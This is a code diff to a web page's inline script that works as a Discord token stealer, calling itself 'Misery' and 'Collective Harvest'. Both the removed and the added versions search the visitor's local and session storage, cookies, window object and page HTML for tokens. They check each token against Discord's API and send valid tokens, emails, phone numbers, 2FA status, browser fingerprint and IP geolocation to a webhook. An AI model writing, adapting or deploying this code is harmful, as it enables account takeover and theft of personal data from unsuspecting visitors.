-                        if (localStorage.hasOwnProperty(key)) {
-                            var val = localStorage[key];
-                            if (typeof val === 'string' && val.length > 20) {
-                                var matches = val.match(tokenRegex);
-                                if (matches) {
-                                    matches.forEach(function(t) {
-                                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                            tokenSources.push({ source: 'localStorage', key: key, token: t });
-                                        }
-                                    });
-                                }
-                                try {
-                                    var parsed = JSON.parse(val);
-                                    var jsonStr = JSON.stringify(parsed);
-                                    var matches2 = jsonStr.match(tokenRegex);
-                                    if (matches2) {
-                                        matches2.forEach(function(t) {
-                                            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                                tokenSources.push({ source: 'localStorage JSON', key: key, token: t });
-                                            }
-                                        });
-                                    }
-                                } catch(e) {}
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
-
-            try {
-                if (sessionStorage && sessionStorage.length > 0) {
-                    for (var key2 in sessionStorage) {
-                        if (sessionStorage.hasOwnProperty(key2)) {
-                            var val2 = sessionStorage[key2];
-                            if (typeof val2 === 'string' && val2.length > 20) {
-                                var matches3 = val2.match(tokenRegex);
-                                if (matches3) {
-                                    matches3.forEach(function(t) {
-                                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                            tokenSources.push({ source: 'sessionStorage', key: key2, token: t });
-                                        }
-                                    });
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
-
-            try {
-                if (document.cookie) {
-                    var cookies = document.cookie.split(';');
-                    cookies.forEach(function(cookie) {
-                        var parts = cookie.trim().split('=');
-                        if (parts.length === 2) {
-                            var val3 = parts[1];
-                            var matches4 = val3.match(tokenRegex);
-                            if (matches4) {
-                                matches4.forEach(function(t) {
-                                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                        tokenSources.push({ source: 'cookie', key: parts[0], token: t });
-                                    }
-                                });
-                            }
-                        }
-                    });
-                }
-            } catch(e) {}
-
-            try {
-                var windowStr2 = JSON.stringify(window);
-                var matches5 = windowStr2.match(tokenRegex);
-                if (matches5) {
-                    matches5.forEach(function(t) {
-                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                            tokenSources.push({ source: 'window object', key: 'global', token: t });
-                        }
-                    });
-                }
-            } catch(e) {}
-
-            try {
-                var html2 = document.documentElement.innerHTML;
-                var matches6 = html2.match(tokenRegex);
-                if (matches6) {
-                    matches6.forEach(function(t) {
-                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                            tokenSources.push({ source: 'HTML', key: 'inline', token: t });
-                        }
-                    });
-                }
-            } catch(e) {}
-
-            var uniqueTokens = [];
-            var seen = new Set();
-            tokenSources.forEach(function(item) {
-                if (!seen.has(item.token)) {
-                    seen.add(item.token);
-                    uniqueTokens.push(item);
-                }
-            });
-
-            if (uniqueTokens.length === 0) {
-                sendToWebhook('🚫 No Discord tokens found in browser storage.');
-                return;
+      try {
+        var ws = JSON.stringify(window);
+        var m3 = ws.match(tokenRegex);
+        if (m3) {
+          m3.forEach(function(t) {
+            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+              tokenSources.push({ source: 'window object', key: 'global', token: t });
             }
+          });
+        }
+      } catch(e) {}
 
-            sendToWebhook('🔑 **Found ' + uniqueTokens.length + ' potential token(s). Validating...**');
+      try {
+        var html2 = document.documentElement.innerHTML;
+        var m4 = html2.match(tokenRegex);
+        if (m4) {
+          m4.forEach(function(t) {
+            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+              tokenSources.push({ source: 'HTML', key: 'inline', token: t });
+            }
+          });
+        }
+      } catch(e) {}
 
-            var validCount = 0;
-            var invalidCount = 0;
+      var uniqueTokens = [];
+      var seen = {};
+      tokenSources.forEach(function(item) {
+        if (!seen[item.token]) {
+          seen[item.token] = true;
+          uniqueTokens.push(item);
+        }
+      });
 
-            var tokenPromises = uniqueTokens.map(function(item) {
-                return new Promise(function(resolve) {
-                    var token = item.token;
-                    var status = 'UNKNOWN';
-                    var userInfo = '';
-                    fetch('https://discord.com/api/v9/users/@me', {
-                        headers: { 'Authorization': token, 'Content-Type': 'application/json' }
-                    }).then(function(res) {
-                        if (res.status === 200) {
-                            return res.json().then(function(data) {
-                                status = '✅ VALID';
-                                validCount++;
-                                var tag = data.global_name || data.username || data.id;
-                                userInfo = ' | ' + tag + ' (' + data.id + ')';
-                                sendToWebhook('🎯 **VALID TOKEN**\nToken: `' + token + '`\nUser: ' + tag + ' (' + data.id + ')\nEmail: ' + (data.email || 'N/A') + '\n2FA: ' + (data.mfa_enabled ? 'Yes' : 'No') + '\nNitro: ' + (data.premium_type || 'None') + '\nVerified: ' + (data.verified ? 'Yes' : 'No') + '\nPhone: ' + (data.phone || 'N/A'));
-                                resolve(status + userInfo + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
-                            });
-                        } else if (res.status === 401) {
-                            status = '❌ INVALID (expired/revoked)';
-                            invalidCount++;
-                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
-                        } else if (res.status === 403) {
-                            status = '⛔ BANNED/LOCKED';
-                            invalidCount++;
-                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
-                        } else if (res.status === 429) {
-                            status = '⚠️ RATE LIMITED';
-                            invalidCount++;
-                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
-                        } else {
-                            status = '⚠️ ERROR ' + res.status;
-                            invalidCount++;
-                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
-                        }
-                    }).catch(function() {
-                        status = '⚠️ NETWORK ERROR';
-                        invalidCount++;
-                        resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
-                    });
+      data.tokens = uniqueTokens;
+
+      var fields = [];
+
+      fields.push({ name: 'Browser', value: data.browser.userAgent.substring(0, 200), inline: false });
+      fields.push({ name: 'Language', value: data.browser.language, inline: true });
+      fields.push({ name: 'Platform', value: data.browser.platform, inline: true });
+      fields.push({ name: 'Screen', value: data.system.screen, inline: true });
+      fields.push({ name: 'Window', value: data.system.window, inline: true });
+      fields.push({ name: 'Pixel Ratio', value: data.system.pixelRatio, inline: true });
+      fields.push({ name: 'Timezone', value: data.system.timezone, inline: true });
+      fields.push({ name: 'UTC Time', value: data.system.utc, inline: false });
+      if (data.system.gpuVendor) fields.push({ name: 'GPU', value: data.system.gpuVendor + ' | ' + data.system.gpuRenderer, inline: false });
+      if (data.network.localIP) fields.push({ name: 'Local IP', value: data.network.localIP, inline: true });
+
+      fields.push({ name: 'Cookies', value: data.storage.cookies + ' found', inline: true });
+      if (data.storage.localStorage && data.storage.localStorage.length > 0) {
+        var lsStr = data.storage.localStorage.slice(0, 5).join('\n');
+        if (data.storage.localStorage.length > 5) lsStr += '\n... and ' + (data.storage.localStorage.length - 5) + ' more';
+        fields.push({ name: 'LocalStorage', value: lsStr.substring(0, 500), inline: false });
+      }
+      if (data.storage.sessionStorage && data.storage.sessionStorage.length > 0) {
+        var ssStr = data.storage.sessionStorage.slice(0, 5).join('\n');
+        if (data.storage.sessionStorage.length > 5) ssStr += '\n... and ' + (data.storage.sessionStorage.length - 5) + ' more';
+        fields.push({ name: 'SessionStorage', value: ssStr.substring(0, 500), inline: false });
+      }
+
+      if (data.emails && data.emails.length > 0) {
+        fields.push({ name: 'Emails Found', value: data.emails.join(', ').substring(0, 500), inline: false });
+      }
+
+      if (data.tokens && data.tokens.length > 0) {
+        fields.push({ name: 'Tokens Found', value: data.tokens.length + ' potential tokens', inline: false });
+
+        var validTokens = [];
+        var invalidTokens = [];
+
+        var tokenPromises = data.tokens.map(function(item) {
+          return new Promise(function(resolve) {
+            var token = item.token;
+            fetch('https://discord.com/api/v9/users/@me', {
+              headers: { 'Authorization': token, 'Content-Type': 'application/json' }
+            }).then(function(res) {
+              if (res.status === 200) {
+                return res.json().then(function(userData) {
+                  validTokens.push({ token: token, user: userData, source: item.source });
+                  resolve();
                 });
+              } else {
+                invalidTokens.push({ token: token, status: res.status, source: item.source });
+                resolve();
+              }
+            }).catch(function() {
+              invalidTokens.push({ token: token, status: 'error', source: item.source });
+              resolve();
             });
+          });
+        });
 
-            Promise.all(tokenPromises).then(function(results) {
-                var summary = results.join('\n');
-                sendToWebhook('```\nMISERY TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
+        Promise.all(tokenPromises).then(function() {
+          if (validTokens.length > 0) {
+            validTokens.forEach(function(vt) {
+              var user = vt.user;
+              var tag = user.global_name || user.username || user.id;
+              var embed = {
+                title: 'VALID TOKEN',
+                color: 0x888888,
+                fields: [
+                  { name: 'User', value: tag + ' (' + user.id + ')', inline: false },
+                  { name: 'Email', value: user.email || 'N/A', inline: true },
+                  { name: '2FA', value: user.mfa_enabled ? 'Enabled' : 'Disabled', inline: true },
+                  { name: 'Nitro', value: user.premium_type || 'None', inline: true },
+                  { name: 'Verified', value: user.verified ? 'Yes' : 'No', inline: true },
+                  { name: 'Source', value: vt.source, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+              };
+              sendToWebhook({ embeds: [embed] });
             });
-        }
+          }
 
-        // ---------- ASCII ANIMATION ----------
-        var asciiContainer = document.getElementById('asciiArt');
-        if (asciiContainer) {
-            var rawText = asciiContainer.textContent;
-            var lines = rawText.split('\n');
-            var wrappedLines = lines.map(function(line) {
-                var span = document.createElement('span');
-                span.className = 'line';
-                span.textContent = line;
-                span.style.animationDelay = (Math.random() * 5).toFixed(2) + 's';
-                span.style.animationDuration = (3 + Math.random() * 4).toFixed(2) + 's';
-                return span;
-            });
-            asciiContainer.innerHTML = '';
-            wrappedLines.forEach(function(span) { asciiContainer.appendChild(span); });
-        }
+          if (invalidTokens.length > 0) {
+            var invMsg = invalidTokens.map(function(it) {
+              return it.token.substring(0, 30) + '... [' + it.status + '] from ' + it.source;
+            }).join('\n');
+            sendToWebhook({ embeds: [{ title: 'Invalid Tokens', color: 0x444444, fields: [{ name: 'Tokens', value: invMsg.substring(0, 500), inline: false }] }] });
+          }
 
-        console.log('Misery extended loaded.');
-    })();
-    </script>
+          sendToWebhook('Harvest complete. Valid: ' + validTokens.length + ' | Invalid: ' + invalidTokens.length + ' | Emails: ' + data.emails.length);
+        });
+      } else {
+        var noTokenEmbed = {
+          title: 'Collective Harvest',
+          color: 0x888888,
+          fields: fields,
+          timestamp: new Date().toISOString()
+        };
+        sendToWebhook({ embeds: [noTokenEmbed] });
+        sendToWebhook('No Discord tokens found in browser storage.');
+      }
+
+      fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data && data.ip) {
+            sendToWebhook('Public IP: ' + data.ip);
+            return fetch('http://ip-api.com/json/' + data.ip);
+          }
+        })
+        .then(function(r) { return r ? r.json() : null; })
+        .then(function(geo) {
+          if (geo && geo.status === 'success') {
+            sendToWebhook('IP Location: ' + geo.city + ', ' + geo.regionName + ', ' + geo.country + ' (ISP: ' + geo.isp + ')');
+          }
+        })
+        .catch(function() {});
+    }
+
+  })();
+  </script>
 </body>
 </html>
